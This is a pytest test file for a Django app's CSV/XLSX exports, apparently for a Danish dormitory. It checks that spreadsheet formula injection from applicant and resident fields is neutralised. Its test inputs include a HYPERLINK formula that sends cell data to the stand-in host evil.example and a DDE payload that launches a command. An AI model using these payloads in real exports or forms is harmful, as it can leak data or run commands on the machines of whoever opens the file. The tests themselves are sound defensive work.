"""CSV/Excel formula injection in the downloads (core.exports).

The admissions export is filled by anonymous applicants on the public form; whoever in Indstillingen
opens the file in Excel would run whatever formula an applicant typed as their name.
"""

import io
from collections.abc import Callable

import pytest
from django.test import Client
from django.utils import timezone
from openpyxl import load_workbook

from admissions.models import Application
from core.exports import csv_or_xlsx_response, neutralise_formula
from core.models import Room
from residents.models import Residency, Resident, Role, active_period

EVIL = '=HYPERLINK("http://evil.example/?"&A2,"klik")'


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (EVIL, "'" + EVIL),
        ("+1+cmd|' /C calc'!A0", "'+1+cmd|' /C calc'!A0"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
        ("\t=1", "'\t=1"),
        ("\r=1", "'\r=1"),
        ("+45 12345678", "'+45 12345678"),  # a phone number: kept as text, not "evaluated"
        ("-12,50", "-12,50"),  # ølkælder amounts stay numbers
        ("+3", "+3"),
        ("Anne-Marie", "Anne-Marie"),
        ("", ""),
    ],
)
def test_neutralise_formula(value: str, expected: str) -> None:
    assert neutralise_formula(value) == expected


def test_xlsx_keeps_the_exact_text_but_never_as_a_formula() -> None:
    resp = csv_or_xlsx_response("xlsx", "T", ["Navn"], [[EVIL], ["-12,50"]], "f")
    assert resp is not None
    ws = load_workbook(io.BytesIO(resp.content)).active
    assert ws["A2"].value == EVIL and ws["A2"].data_type == "s"
    assert ws["A3"].value == "-12,50"


@pytest.mark.django_db
def test_admissions_export_neutralises_applicant_formulas(make_resident: Callable[..., Resident]) -> None:
    Application.objects.create(
        type="rundvisning", full_name=EVIL, email="a@x.dk", university="@SUM(1)", submitted_at=timezone.now()
    )
    c = Client()
    c.force_login(make_resident(email="ind@gahk.dk", roles=[Role.INDSTILLING]))

    body = c.get("/optagelse/eksport", {"format": "csv"}).content.decode("utf-8-sig")
    assert "'=HYPERLINK" in body and "'@SUM(1)" in body

    ws = load_workbook(io.BytesIO(c.get("/optagelse/eksport", {"format": "xlsx"}).content)).active
    assert ws["C2"].value == EVIL and ws["C2"].data_type == "s"


@pytest.mark.django_db
def test_alumneliste_export_neutralises_resident_formulas(make_resident: Callable[..., Resident]) -> None:
    r = make_resident(email="b@gahk.dk", study="=1+1")
    y, m = active_period()
    room = Room.objects.create(legacy_index=1, number=1, floor="stuen", side="mod gaden")
    Residency.objects.create(resident=r, room=room, year=y, month=m)
    c = Client()
    c.force_login(r)
    body = c.get(f"/intern/alumneliste/eksport?format=csv&period={y}-{m}").content.decode("utf-8-sig")
    assert "'=1+1" in body
